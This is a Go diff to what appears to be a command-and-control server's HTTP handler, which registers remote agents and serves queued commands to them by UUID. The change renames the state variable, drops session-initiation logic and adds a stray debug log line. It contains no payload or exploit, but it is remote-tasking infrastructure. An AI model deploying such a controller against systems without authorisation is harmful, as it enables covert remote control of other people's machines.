@@ -36,10 +36,10 @@ func requestHandler() http.HandlerFunc {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
 			mu.Lock()
-			state.RegisteredAgents = append(state.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
+			State.RegisteredAgents = append(State.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
 			mu.Unlock()
 			logger.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
-		} else if strings.TrimSpace(r.Header.Get("UUID")) == state.SelectedAgent.UUID || "ALL" == state.SelectedAgent.UUID {
+		} else if strings.TrimSpace(r.Header.Get("UUID")) == State.SelectedAgent.Alias || "ALL" == State.SelectedAgent.Alias {
 			logger.Debug("Connected Agent:")
 			logger.Debug("Address: " + r.RemoteAddr)
 			logger.Debug("Username: " + r.Header.Get("Username"))
@@ -64,14 +64,8 @@ func requestHandler() http.HandlerFunc {
 			} else if string(response) != "" {
 				logger.Info("Received response:\n" + string(response))
 			}
-			if len(state.Tasks) != 0 {
-				if state.Tasks[0].Command == "SESSION" {
-					logger.Info("Initiating session")
-					go InitiateSession()
-					state.Tasks = state.Tasks[1:]
-				}
-				requestCommand(w, r)
-			}
+
+			requestCommand(w, r)
 		} else {
 			w.Write([]byte(""))
 			logger.Debug("Pinged agent: " + r.RemoteAddr)
@@ -80,11 +74,12 @@ func requestHandler() http.HandlerFunc {
 }
 
 func requestCommand(w http.ResponseWriter, r *http.Request) {
-	if len(state.Tasks) != 0 {
-		if state.Tasks[0].Command != "" && state.Tasks[0].Recipient.UUID == strings.TrimSpace(r.Header.Get("UUID")) {
-			w.Write([]byte(state.Tasks[0].Command))
-			logger.Info("Command requested: " + state.Tasks[0].Command)
-			state.Tasks = state.Tasks[1:]
+	if len(State.Tasks) != 0 {
+		logger.Warn("asdad")
+		if State.Tasks[0].Command != "" && State.Tasks[0].Recipient.UUID == strings.TrimSpace(r.Header.Get("UUID")) {
+			w.Write([]byte(State.Tasks[0].Command))
+			logger.Info("Command requested: " + State.Tasks[0].Command)
+			State.Tasks = State.Tasks[1:]
 		}
 	} else {
 		w.Write([]byte(""))
